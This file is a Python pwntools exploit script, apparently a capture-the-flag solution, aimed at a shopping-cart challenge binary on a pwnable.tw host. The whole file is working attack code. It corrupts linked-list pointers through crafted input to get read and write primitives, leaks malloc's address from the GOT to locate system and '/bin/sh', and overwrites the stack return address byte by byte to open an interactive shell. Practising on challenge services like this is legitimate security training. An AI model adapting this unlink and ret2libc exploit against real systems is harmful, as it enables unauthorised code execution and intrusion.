from pwn import *

HOST = "chall.pwnable.tw"
PORT = 10104

conn = None


def add(item_no):
    conn.sendafter('>', '2')
    conn.sendafter('>', str(item_no))


def remove(item_no):
    conn.sendafter('>', '3')
    conn.sendafter('>', str(item_no))


def checkout():
    conn.sendafter('>', '5')
    conn.sendafter('>', 'y')


def write_prim(where, what):
    char_ptr = 0x08048D90  # Just a valid ptr to a string.

    # Exploiting the unlinking algorithm by corrupting the next and prev
    # pointers.
    remove("27" + p32(char_ptr) + "AAAA" + p32(what) + p32(where-0x8))


def leak(where):
    writeable = 0x804b088  # Some address that's writeable.

    # Overwriting the name ptr of the node to print whatever we want.
    remove("27" + p32(where) + "AAAA" + p32(writeable) + p32(writeable))
    conn.recvuntil(':')

    return u32(conn.recv(4))


def main():
    global conn
    conn = remote(HOST, PORT)

    linkedlist_ptr = 0  # Ptr to the head node in the linked list.
    linkedlist_bss = 0x0804B070  # linkedlist_ptr stored here on .bss segment.
    node_ptr = lambda : linkedlist_ptr + 0x498  # Ptr to the last node before our iPhone 8 node.
    malloc_ptr = 0  # Ptr to malloc in libc. Used to find system.
    malloc_got = 0x0804B024  # Ptr to malloc entry in GOT.
    system_ptr = lambda : malloc_ptr - 0x35720  # Calculates system addr.
    iphone8_ptr = 0  # A ptr to the stack address our iPhone 8 node sits.
    return_ptr = lambda : iphone8_ptr + 0x84  # Return addr ptr on the stack
    binsh_ptr = lambda : malloc_ptr + 0xe8e2b  # /bin/sh ptr
    base = lambda : iphone8_ptr - 0x300 - (iphone8_ptr & 0xFF)  # A free portion of the stack.

    # STEP 1: Sum total to $7174. We get an iPhone 8 when we do.
    p = log.progress("Creating iPhone 8 Node")

    for _ in range(6):
        p.status("Adding iPhone 6 x 6")
        add(1)

    for _ in range(20):
        p.status("Adding iPhone 6 Plus x 20")
        add(2)

    p.success("Done")

    checkout()

    # STEP 2: Leaking address to system via a leak to malloc. We do this by
    # leaking what's on GOT entry for malloc.
    malloc_ptr = leak(malloc_got)
    log.info("Malloc @ %s" % hex(malloc_ptr))
    log.info("System @ %s" % hex(system_ptr()))

    # STEP 3: Finding the address of the return address of main on the stack.
    # To do this we find out where our iPhone 8 node is on the stack as a leak
    # To do that, you need to know the start of the linked list.
    linkedlist_ptr = leak(linkedlist_bss)  # Leaking the head of the LL.
    iphone8_ptr = leak(node_ptr() + 0x8)  # 2nd last node's next ptr is to our iPhone 8 node.
    log.info("LinkedList @ %s" % hex(linkedlist_ptr))
    log.info("iPhone 8 @ %s" % hex(iphone8_ptr))
    log.info("Return @ %s" % hex(return_ptr()))  # Return addr ptr is calculated with this lambda.

    # STEP 4: Finally, we need to set up the stack so that we can return into system.
    # we can't just simply write the system address to the stack, because the way our write
    # primitive works it will attempt to write to libc, which won't work. So we use a trick
    # where we do a byte by byte write by utilizing a safe part of the stack and using the least
    # siginificant byte of this stack address to do our writes.
    p = log.progress("ROPing")
    p.status("Overwriting return address with system.")
    write_prim(return_ptr(), base() + (system_ptr() & 0xFF))
    write_prim(return_ptr() + 1, base() + ((system_ptr()>>8) & 0xFF))
    write_prim(return_ptr() + 2, base() + ((system_ptr()>>16) & 0xFF))
    write_prim(return_ptr() + 3, base() + ((system_ptr()>>24) & 0xFF))

    p.status("Writing null word for fake EBP.")
    write_prim(return_ptr() + 4, base())
    write_prim(return_ptr() + 5, base())
    write_prim(return_ptr() + 6, base())
    write_prim(return_ptr() + 7, base())

    p.status("Writing /bin/sh ptr as system argument.")
    write_prim(return_ptr() + 8, base() + (binsh_ptr() & 0xFF))
    write_prim(return_ptr() + 9, base() + ((binsh_ptr()>>8) & 0xFF))
    write_prim(return_ptr() + 10, base() + ((binsh_ptr()>>16) & 0xFF))
    write_prim(return_ptr() + 11, base() + ((binsh_ptr()>>24) & 0xFF))
    p.success("Done")

    conn.sendafter('>', '6')
    conn.interactive()


if __name__ == "__main__":
    main()

